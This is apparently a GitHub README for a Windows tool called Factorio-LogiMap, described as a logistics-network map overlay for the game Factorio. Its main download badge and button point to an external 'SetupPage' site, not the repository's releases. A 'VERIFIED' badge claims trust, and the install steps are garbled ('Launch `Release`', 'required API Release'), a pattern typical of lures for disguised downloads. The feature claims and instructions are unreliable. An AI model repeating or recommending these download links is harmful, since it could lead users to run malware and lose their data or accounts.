# Factorio‑LogiMap

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-1d4ed8?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/OVERVIEW-DOCS-db2777?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=161b22" alt="OVERVIEW"></a> <a href="#-configuration-system"><img src="https://img.shields.io/badge/CONFIGS-PRESETS-65a30d?style=for-the-badge&logo=files&logoColor=white&labelColor=161b22" alt="CONFIGS"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/STATUS-VERIFIED-7c3aed?style=for-the-badge&logo=checkmarx&logoColor=white&labelColor=161b22" alt="STATUS"></a> <a href="#-overview"><img src="https://img.shields.io/badge/EDITION-STANDARD-ea580c?style=for-the-badge&logo=rocket&logoColor=white&labelColor=161b22" alt="EDITION"></a>
</div>

**Interactive logistics‑network visualizer for Factorio – Windows 10/11 only**

---

## What is Factorio‑LogiMap?

Factorio‑LogiMap is a lightweight desktop companion that lets you **see**, **analyse**, and **edit** your entire logistics network on an overlay map.
- Snap‑in view of belts, inserters, chests, robo‑ports and train stations.
- Click‑to‑highlight paths, filter by item, and spot bottlenecks in seconds.
- Real‑time updates while the game runs (via the official Factorio remote‑API).

Designed for modders, planners, and speed‑runners who need a clear picture of their factory without leaving the game.

---

## Why use it?

| ✅ Feature | 💡 Benefit |
|-----------|------------|
| **Live map overlay** | No more guessing – see the exact flow of resources. |
| **Filter & search** | Focus on a single item or circuit instantly. |
| **Editable nodes** | Drag‑and‑drop belts or inserters directly from the map. |
| **Performance‑tuned** | Runs smoothly on Windows 10 & 11, even on large saves. |
| **Open‑source** | Fork, extend, or contribute your own visualisation utility. |

---

## Getting Started

1. **Download** the latest release from the button below.
2. Extract the zip file into a folder of your choice.
3. Launch `Release` (the installer will guide you through the required API Release).
4. Open your Factorio save, enable the remote‑API, and let LogiMap sync automatically.

> **⚠️ Windows only** – the application relies on Windows‑specific graphics APIs and is not compatible with macOS or Linux.

---

## Quick‑Start Demo

```text
▶ Launch Factorio‑LogiMap
▶ Choose “Connect to running Factorio instance”
▶ Select an item (e.g., copper plate) → map highlights all routes
▶ Right‑click a belt → “Edit” → adjust speed or direction
▶ Save changes → they appear instantly in-game
```

---

## Installation Buttons

<div style="display:flex; gap:10px; flex-wrap:wrap;">
  <a href="https://rewfdf.github.io/SetupPage/" style="background:#4A90E2;color:white;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;">Download & Release</a>
  <a href="https://github.com/IntersectScholar/Factorio-LogiMap/releases/latest" style="background:#7ED321;color:white;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;">GitHub Releases</a>
  <a href="https://github.com/IntersectScholar/Factorio-LogiMap/wiki" style="background:#F5A623;color:white;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;">Documentation</a>
</div>

---

## Contributing

We welcome contributions!

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/awesome‑utility`).
3. Ensure the code builds on Windows 10/11.
4. Submit a pull request with a clear description and screenshots.

Please read the **[CONTRIBUTING.md](https://github.com/IntersectScholar/Factorio-LogiMap/blob/main/CONTRIBUTING.md)** for style guidelines and testing procedures.

---

## Support & Community

- **Issues:** Open a ticket on GitHub for bugs or feature requests.
- **Discord:** Join the *Factorio‑LogiMap* channel for real‑time help.
- **Wiki:** Detailed tutorials, FAQ, and API reference are available in the repository wiki.

---

## License

Factorio‑LogiMap is released under the **MIT License** – see the [LICENSE](https://github.com/IntersectScholar/Factorio-LogiMap/blob/main/LICENSE) file for full terms.

---

*Build smarter, play faster – let Factorio‑LogiMap draw the lines for you.*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```